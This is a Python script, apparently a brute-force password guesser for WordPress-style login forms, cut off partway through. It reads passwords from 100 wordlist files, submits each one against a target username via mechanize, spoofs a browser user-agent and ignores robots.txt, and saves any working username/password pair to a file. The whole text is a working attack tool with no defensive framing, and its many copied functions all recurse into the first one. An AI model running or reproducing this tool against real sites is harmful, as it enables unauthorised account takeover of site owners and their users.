import threading, mechanize, sys

z=""
inurl=""

def input_data(urlnya,username):
    global inurl,z
    inurl=urlnya
    z=username

k1=open("0.1.txt","r")
k2=open("0.2.txt","r")
k3=open("0.3.txt","r")
k4=open("0.4.txt","r")
k5=open("0.5.txt","r")
k6=open("0.6.txt","r")
k7=open("0.7.txt","r")
k8=open("0.8.txt","r")
k9=open("0.9.txt","r")
k10=open("0.10.txt","r")
k11=open("0.11.txt","r")
k12=open("0.12.txt","r")
k13=open("0.13.txt","r")
k14=open("0.14.txt","r")
k15=open("0.15.txt","r")
k16=open("0.16.txt","r")
k17=open("0.17.txt","r")
k18=open("0.18.txt","r")
k19=open("0.19.txt","r")
k20=open("0.20.txt","r")
k21=open("0.21.txt","r")
k22=open("0.22.txt","r")
k23=open("0.23.txt","r")
k24=open("0.24.txt","r")
k25=open("0.25.txt","r")
k26=open("0.26.txt","r")
k27=open("0.27.txt","r")
k28=open("0.28.txt","r")
k29=open("0.29.txt","r")
k30=open("0.30.txt","r")
k31=open("0.31.txt","r")
k32=open("0.32.txt","r")
k33=open("0.33.txt","r")
k34=open("0.34.txt","r")
k35=open("0.35.txt","r")
k36=open("0.36.txt","r")
k37=open("0.37.txt","r")
k38=open("0.38.txt","r")
k39=open("0.39.txt","r")
k40=open("0.40.txt","r")
k41=open("0.41.txt","r")
k42=open("0.42.txt","r")
k43=open("0.43.txt","r")
k44=open("0.44.txt","r")
k45=open("0.45.txt","r")
k46=open("0.46.txt","r")
k47=open("0.47.txt","r")
k48=open("0.48.txt","r")
k49=open("0.49.txt","r")
k50=open("0.50.txt","r")
k51=open("0.51.txt","r")
k52=open("0.52.txt","r")
k53=open("0.53.txt","r")
k54=open("0.54.txt","r")
k55=open("0.55.txt","r")
k56=open("0.56.txt","r")
k57=open("0.57.txt","r")
k58=open("0.58.txt","r")
k59=open("0.59.txt","r")
k60=open("0.60.txt","r")
k61=open("0.61.txt","r")
k62=open("0.62.txt","r")
k63=open("0.63.txt","r")
k64=open("0.64.txt","r")
k65=open("0.65.txt","r")
k66=open("0.66.txt","r")
k67=open("0.67.txt","r")
k68=open("0.68.txt","r")
k69=open("0.69.txt","r")
k70=open("0.70.txt","r")
k71=open("0.71.txt","r")
k72=open("0.72.txt","r")
k73=open("0.73.txt","r")
k74=open("0.74.txt","r")
k75=open("0.75.txt","r")
k76=open("0.76.txt","r")
k77=open("0.77.txt","r")
k78=open("0.78.txt","r")
k79=open("0.79.txt","r")
k80=open("0.80.txt","r")
k81=open("0.81.txt","r")
k82=open("0.82.txt","r")
k83=open("0.83.txt","r")
k84=open("0.84.txt","r")
k85=open("0.85.txt","r")
k86=open("0.86.txt","r")
k87=open("0.87.txt","r")
k88=open("0.88.txt","r")
k89=open("0.89.txt","r")
k90=open("0.90.txt","r")
k91=open("0.91.txt","r")
k92=open("0.92.txt","r")
k93=open("0.93.txt","r")
k94=open("0.94.txt","r")
k95=open("0.95.txt","r")
k96=open("0.96.txt","r")
k97=open("0.97.txt","r")
k98=open("0.98.txt","r")
k99=open("0.99.txt","r")
k100=open("0.100.txt","r")
def x1():
    w1=k1.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x2():
    w1=k2.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x3():
    w1=k3.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x4():
    w1=k4.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x5():
    w1=k5.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x6():
    w1=k6.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x7():
    w1=k7.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x8():
    w1=k8.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x9():
    w1=k9.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x10():
    w1=k10.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x11():
    w1=k11.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x12():
    w1=k12.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x13():
    w1=k13.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x14():
    w1=k14.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x15():
    w1=k15.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x16():
    w1=k16.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x17():
    w1=k17.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x18():
    w1=k18.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x19():
    w1=k19.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x20():
    w1=k20.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x21():
    w1=k21.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x22():
    w1=k22.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x23():
    w1=k23.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x24():
    w1=k24.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x25():
    w1=k25.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x26():
    w1=k26.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x27():
    w1=k27.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x28():
    w1=k28.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x29():
    w1=k29.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x30():
    w1=k30.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x31():
    w1=k31.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
